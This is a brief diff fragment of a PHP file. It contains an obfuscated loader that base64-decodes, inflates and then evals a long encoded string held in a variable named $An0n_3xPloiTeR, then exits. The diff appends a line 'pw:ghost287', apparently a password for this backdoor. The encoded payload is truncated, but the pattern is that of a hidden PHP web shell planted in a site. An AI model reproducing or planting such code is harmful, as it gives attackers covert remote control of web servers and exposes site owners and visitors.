@@ -4,3 +4,5 @@ $An0n_3xPloiTeR = "=EK8eL7A/jO0CbxZErzf18UxgsZnYjBWE26wRlKXOkEFg+Kx9ETC0ni1sIWny
 eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
 exit;
 ?>
+
+pw:ghost287
